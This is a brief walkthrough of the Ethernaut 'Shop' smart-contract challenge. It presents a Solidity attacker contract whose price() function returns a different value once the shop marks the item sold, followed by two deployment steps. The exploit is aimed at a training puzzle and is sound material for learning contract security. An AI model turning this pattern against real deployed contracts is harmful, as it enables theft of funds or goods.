# Shop

In this challenge we implement an interface and override the function. The real catch is that on the first call it must return a different value, than it does the second time. See the ternary operation.

```// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract ShopAttack is Buyer {

    Shop shop;

    constructor(address _address) public {
        shop = Shop(_address);
    }

    function price() external view override returns (uint) {
        return shop.isSold() ? 0 : 100;
    }

    function attack() external {
        shop.buy();
    }
}
```

Step 1:

Deploy w/ ethernaut instance address as constructor arg

Step2:

call attack function